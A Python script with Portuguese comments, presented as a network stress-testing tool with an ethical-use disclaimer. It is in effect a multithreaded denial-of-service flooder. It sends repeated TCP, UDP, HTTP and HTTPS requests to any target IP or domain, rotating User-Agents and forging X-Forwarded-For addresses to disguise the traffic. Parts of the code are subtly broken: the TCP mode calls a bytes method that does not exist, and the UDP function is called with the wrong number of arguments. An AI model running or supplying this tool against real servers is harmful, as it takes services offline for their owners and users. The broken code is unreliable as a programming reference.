#!/usr/bin/env python3
"""
Ferramenta de Teste de Estresse para Redes Locais
Uso ético: apenas em servidores próprios ou com autorização.
"""

import socket
import threading
import random
import ssl
import time
import logging
from datetime import datetime

# Configuração de logging
logging.basicConfig(
    filename='stress_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Lista de User-Agents para ataques HTTP/HTTPS
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

def gerar_ip_falso():
    """Gera um IP aleatório para cabeçalhos X-Forwarded-For."""
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def criar_cabecalhos_http(host):
    """Cria cabeçalhos HTTP falsos para a requisição."""
    user_agent = random.choice(USER_AGENTS)
    ip_falso = gerar_ip_falso()
    cabecalhos = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"X-Forwarded-For: {ip_falso}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    return cabecalhos.encode('ascii')

def ataque_tcp(ip, porta, timeout):
    """Ataque TCP: abre conexão e envia dados."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, porta))
            sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip).encode())
            logging.info(f"TCP ataque bem-sucedido para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"TCP falha: {e}")

def ataque_udp(ip, porta):
    """Ataque UDP: envia pacotes aleatórios."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            pacote = random._urandom(1024)  # 1024 bytes aleatórios
            sock.sendto(pacote, (ip, porta))
            logging.info(f"UDP pacote enviado para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"UDP falha: {e}")

def ataque_http(ip, porta, timeout):
    """Ataque HTTP: envia requisição GET com cabeçalhos falsos."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((ip, porta))
            cabecalhos = criar_cabecalhos_http(ip)
            sock.send(cabecalhos)
            logging.info(f"HTTP requisição enviada para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"HTTP falha: {e}")

def ataque_https(ip, porta, timeout):
    """Ataque HTTPS: estabelece conexão TLS e envia requisição."""
    try:
        contexto = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            with contexto.wrap_socket(sock, server_hostname=ip) as ssock:
                ssock.connect((ip, porta))
                cabecalhos = criar_cabecalhos_http(ip)
                ssock.send(cabecalhos)
                logging.info(f"HTTPS requisição enviada para {ip}:{porta}")
    except Exception as e:
        logging.debug(f"HTTPS falha: {e}")

def resolver_dominio(dominio):
    """Resolve um domínio para endereço IP."""
    try:
        ip = socket.gethostbyname(dominio)
        print(f"[+] Domínio {dominio} resolvido para {ip}")
        return ip
    except socket.gaierror:
        print("[!] Erro: domínio não pôde ser resolvido.")
        return None

def worker(ip, porta, tipo, timeout, repeticoes):
    """Função executada por cada thread: realiza múltiplos ataques."""
    ataques = {
        'tcp': ataque_tcp,
        'udp': ataque_udp,
        'http': ataque_http,
        'https': ataque_https
    }
    ataque_func = ataques.get(tipo)
    if not ataque_func:
        return
    for _ in range(repeticoes):
        ataque_func(ip, porta, timeout)
        # Pequena pausa para evitar uso excessivo de CPU
        time.sleep(0.001)

def main():
    print("=== Ferramenta de Teste de Estresse (Uso Ético) ===")
    print("Servidores próprios ou com autorização apenas.\n")

    # Entrada de dados
    alvo = input("IP ou domínio alvo: ").strip()
    porta = int(input("Porta: ").strip())
    tipo = input("Tipo de ataque (tcp/udp/http/https): ").strip().lower()
    num_threads = int(input("Número de threads: ").strip())
    timeout = float(input("Timeout (segundos): ").strip())
    repeticoes_por_thread = int(input("Repetições por thread: ").strip())

    # Resolver domínio se necessário
    if not alvo.replace('.', '').isdigit():
        ip = resolver_dominio(alvo)
        if not ip:
            return
    else:
        ip = alvo

    print(f"\n[+] Iniciando teste contra {ip}:{porta} com {num_threads} threads, {repeticoes_por_thread} repetições cada.")
    print("[+] Pressione Ctrl+C para interromper.\n")

    # Iniciar threads
    threads = []
    inicio = time.time()

    try:
        for i in range(num_threads):
            t = threading.Thread(
                target=worker,
                args=(ip, porta, tipo, timeout, repeticoes_por_thread),
                daemon=True
            )
            t.start()
            threads.append(t)

        # Aguardar todas as threads terminarem
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\n[!] Teste interrompido pelo usuário.")

    fim = time.time()
    duracao = fim - inicio
    print(f"\n[+] Teste concluído em {duracao:.2f} segundos.")
    print("[+] Logs salvos em stress_test.log")

if __name__ == "__main__":
    main()